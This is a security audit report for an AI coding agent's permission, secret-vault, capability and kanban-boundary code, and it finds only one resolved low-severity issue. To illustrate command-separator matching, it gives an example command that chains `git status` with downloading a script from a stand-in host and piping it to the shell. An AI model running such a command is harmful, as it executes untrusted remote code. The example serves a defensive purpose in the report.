# 02 — Security Audit

**Scope:** `packages/core/src/security/` — permission-policy, secret-vault, capabilities, yolo-risk, file-permissions, config-secrets, secret-scrubber, kanban-boundary

---

## Permission Policy (`permission-policy.ts`, 1066 lines)

### Architecture

The permission evaluation pipeline (in `evaluate()`):
1. **Policy invalid** → deny everything
2. **Eval cache** → skip re-evaluation (excludes `write` + state-root writes)
3. **Session soft deny** → deny for rest of session
4. **Session soft allow** → one-shot auto (consumed immediately)
5. **Trust deny patterns** → permanent deny
6. **Tool default deny** → `tool.permission === 'deny'`
7. **Trust allow patterns** → auto (with separator-aware matching for shell)
8. **Sensitive read detection** → confirm (outside YOLO)
9. **YOLO** → auto everything except destructive
10. **Write-tool smart bypass** → auto if already read (excludes agent state root)
11. **Tool default auto + non-mutating** → auto
12. **Fallback** → confirm

### Verified: Shell Subject Separator Matching

**File:** `permission-policy.ts:451`

```typescript
const allowMatches = hasShellSubject(tool) ? matchesCommandTrust : matchesTrust;
```

Shell subjects use `matchesCommandTrust` (separator-aware) for allow patterns, so `git *` does NOT authorize `git status; wget evil.sh | sh`. Deny patterns keep the permissive `matchesTrust` matcher — this is deliberate (more restrictive on deny is unnecessary).

### Verified: Agent State Root Protection

**File:** `permission-policy.ts:207–219, 542–548`

The `hasAgentStateWriteTarget` method inspects ALL path-bearing keys (`path`, `file_path`, `file`, `filePath`, `files`, `target`, `targetPath`, `out`, `directory`, `cwd`, `template`) — not just `subjectKey`. This prevents bypassing state-root protection by switching tools (write → edit → patch).

The write-tool smart bypass (line 543) explicitly excludes agent state root:
```typescript
if (ctx.hasRead(subject) && !isInsideAgentStateRoot(subject)) {
  return { permission: 'auto', source: 'context', ... };
}
```

### Performance Note: State-Root Check Runs Before the Eval Cache

**File:** `permission-policy.ts:393`

```typescript
if (tool.name !== 'write' && !this.hasAgentStateWriteTarget(tool, input, ctx)) {
  const cached = this._evalCache.get(evalKey);
  if (cached !== undefined) return cached;
}
```

Every non-`write` tool call with ANY path-bearing key triggers `hasAgentStateWriteTarget`, which calls `fsWriteTargetPaths(input)` and then `path.resolve` + `isInsideAgentStateRoot` for each path. This is O(keys × paths) per permission evaluation, and it runs BEFORE the cache check. For a `replace` tool with `files: ["src/a.ts", "src/b.ts", ...]` (10 files), this is 10 `path.resolve` + 10 `isInsideAgentStateRoot` calls per evaluation, every time.

**Impact:** Low — the functions are pure string operations. But it's a hidden cost on every permission evaluation for multi-file tools.

---

## Secret Vault (`secret-vault.ts`, 830 lines)

### Architecture

AES-256-GCM encryption with three key file formats:
- **v1 (legacy):** 32-byte raw key
- **v2 (versioned):** 4-byte magic `WSKV` + 1-byte version + 32-byte key
- **v3 (wrapped/KEK):** 4-byte magic `WSKW` + 1-byte version + 16-byte salt + 12-byte IV + 16-byte tag + 32-byte ciphertext

The KEK is derived from `WRONGSTACK_VAULT_PASSPHRASE` via scrypt (N=2^15, r=8, p=1).

### Finding A-06 (Low): Existing-Key Self-Heal Is Best-Effort

**File:** `secret-vault.ts:150–177`

`checkKeyFilePermissions` detects incorrect POSIX permissions and starts a fire-and-forget `restrictPermissions` repair. Normal key creation already uses restrictive permissions, so this path primarily repairs a key loosened by an older build or an external operation. The repair rejection is suppressed after the warning is emitted, which means callers cannot await or observe hardening completion.

**Impact:** Low and bounded to the repair path for an already-loose POSIX key file. Track or await the hardening promise if this path needs the same completion guarantee as key creation/rotation.

**Resolution (2026-08-10):** Implemented. Loose-key detection now schedules repair through the vault's tracked hardening queue; `flushHardening()` waits for the repair. The POSIX regression test holds the repair promise open and verifies the flush remains pending.

### Verified: Atomic Key File Write

**File:** `secret-vault.ts:199` (`writeKeyFileAtomicSync`)

Crash-atomic synchronous write: temp file (0o600) + fsync + rename. The sync is deliberate — a torn key file means every secret is unrecoverable. The comment at line 187 explains Windows behavior: `chmod`-style modes only move the read-only bit, so `restrictFilePermissions` is needed for real ACL protection.

### Design Note: Key File Mode AND Semantics

**File:** `persistence/src/atomic-write.ts:109–121`

```typescript
if (opts.mode !== undefined) {
  mode = existing === undefined ? opts.mode : opts.mode & existing;
} else {
  mode = existing;
}
```

WS-045 fixed the mode to be "most restrictive of the two" (bitwise AND). This is correct for tightening (0600 over 0644 → 0600), but means a caller can never intentionally widen permissions. For the vault key file this is the right default, but for other files (e.g., shared config) it could be surprising.

This is an intentional restrictive-write contract, not a defect. Callers that need to widen permissions must use an explicit permission-management operation rather than `atomicWrite`.

---

## Kanban Boundary (`kanban-boundary.ts`, 345 lines)

### Architecture

The boundary evaluator:
1. Resolves kanban identity (`ctx.currentKanbanBoardId`, `ctx.currentKanbanTaskId`)
2. If governance required, validates board + task + readiness + running assignment
3. Checks lease ownership for subagent writes
4. Resolves boundary layers from the board/task
5. Evaluates path-based or opaque boundary per tool capabilities

### Verified: Lease Ownership Check

**File:** `kanban-boundary.ts:133–153`

When a subagent has a frozen `leaseId`, the boundary checks that the task's current assignment still matches. A mismatch means `recover_stale` reclaimed and reassigned the task — the stale worker's file modifications are blocked. This is a strong correctness guarantee for multi-agent coordination.

### Design Note: Governance Includes `net.outbound`

**File:** `kanban-boundary.ts:196–204`

```typescript
return capabilities.some(
  (capability) =>
    capability === 'fs.write' ||
    capability === 'fs.write.outside-project' ||
    capability === 'package.install' ||
    capability === 'tool.mutate.any' ||
    capability.startsWith('shell.') ||
    capability === 'net.outbound',  // ← network calls require governance
);
```

`GOVERNANCE_CONTROL_TOOLS` exempts `kanban`, `plan`, `task`, and `todo` so the control plane can establish governance state. Other tools with `net.outbound` require a running Kanban card. This is expected policy behavior, not a security finding, but should remain documented for autonomous-loop users.

---

## Capabilities System (`capabilities.ts`)

### Verified: Dangerous Capability Detection

`getDangerousCapabilities(tool)` returns capabilities in the dangerous set (`shell.arbitrary`, `fs.write.outside-project`, `mcp.proxy`, etc.). The tool executor uses this at line 250 to downgrade `auto` → `confirm` for dangerous-capability tools outside YOLO (line 374–382). This is defense-in-depth on top of the permission policy.

### Verified: Subagent Dangerous Capability Enforcement

`hasDangerousCapabilityForSubagents(tool)` is checked at line 488 for audit logging. Subagent dangerous capabilities are tracked in the permission event for observability.

---

## File Permissions (`file-permissions.ts`)

### Verified: Platform-Aware Hardening

`restrictFilePermissions` handles POSIX (chmod) and Windows (ACL). The Windows path uses `icacls` to restrict access to the current user only. This is called after atomic writes for secret files (vault key, config with encrypted secrets).

---

## Summary

The security layer is well-architected with defense-in-depth at multiple levels:
1. **Schema validation** before permission checks
2. **PreToolUse hooks** before permission
3. **Permission policy** with eval cache, trust patterns, YOLO gates
4. **Dangerous capability downgrade** post-permission
5. **Kanban boundary** for scope enforcement
6. **Secret scrubbing** on all tool output
7. **File permission hardening** on sensitive files

No critical or high-severity security vulnerability was confirmed. The low-severity existing-key hardening completion gap is resolved; the eval-cache and governance observations describe intentional trade-offs.
